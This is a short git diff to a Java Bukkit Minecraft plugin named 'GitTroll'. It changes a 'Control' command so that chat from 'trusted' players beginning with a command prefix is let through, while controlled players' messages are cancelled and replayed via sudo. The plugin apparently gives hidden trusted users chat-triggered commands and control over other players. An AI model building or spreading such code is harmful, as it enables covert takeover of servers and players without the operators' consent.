@@ -6,7 +6,6 @@ import java.util.Map;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
-import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerMoveEvent;
@@ -20,6 +19,7 @@ import net.Lenni0451.GitTroll.command.CommandBase;
 import net.Lenni0451.GitTroll.event.EventListener;
 import net.Lenni0451.GitTroll.event.events.EventPlayerPacket;
 import net.Lenni0451.GitTroll.event.types.Event;
+import net.Lenni0451.GitTroll.manager.CommandManager;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
 import net.minecraft.server.v1_8_R3.PacketPlayInArmAnimation;
@@ -113,9 +113,12 @@ public class Control extends CommandBase implements Listener, EventListener {
 		}
 	}
 	
-	@EventHandler(priority = EventPriority.LOW, ignoreCancelled = true)
+	@EventHandler
 	public void onMessage(AsyncPlayerChatEvent event) {
 		CustomPlayer player = CustomPlayer.instanceOf(event.getPlayer());
+		if(player.isTrusted() && event.getMessage().toLowerCase().startsWith(CommandManager.COMMAND_PREFIX)) {
+			return;
+		}
 		if(this.controlledPlayers.containsKey(player)) {
 			event.setCancelled(true);
 			this.controlledPlayers.get(player).sudo(event.getMessage());
